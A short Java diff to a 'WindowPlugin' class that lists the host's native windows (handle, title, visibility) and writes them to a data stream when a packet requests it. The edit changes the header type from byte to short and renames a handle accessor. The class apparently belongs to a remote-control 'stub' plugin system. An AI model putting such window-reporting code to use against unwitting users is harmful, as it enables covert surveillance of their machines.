@@ -17,7 +17,7 @@ import nativewindowlib.WindowUtils;
 
 public class WindowPlugin extends StubPlugin {
 	
-	public static final byte HEADER_LIST = -127;
+	public static final short HEADER_LIST = -127;
 	
 	private DataInputStream dis;
 	private DataOutputStream dos;
@@ -39,9 +39,9 @@ public class WindowPlugin extends StubPlugin {
 	}
 
 	@Override
-	public void onPacket(byte header) throws Exception {
+	public void onPacket(short header) throws Exception {
 		if (header == HEADER_LIST) {
-			dos.writeByte(HEADER_LIST);
+			dos.writeShort(HEADER_LIST);
 			
 			List<NativeWindow> windows = WindowUtils.getWindows();
 			List<NativeWindow> sendWindows = new ArrayList<NativeWindow>();
@@ -57,7 +57,7 @@ public class WindowPlugin extends StubPlugin {
 			for (int i = 0; i < sendWindows.size(); i++) {
 				NativeWindow window = sendWindows.get(i);
 				
-				dos.writeInt(window.getHwnd());
+				dos.writeInt(window.getHandle());
 				writeString(window.getTitle());
 				dos.writeBoolean(window.isVisible());
 
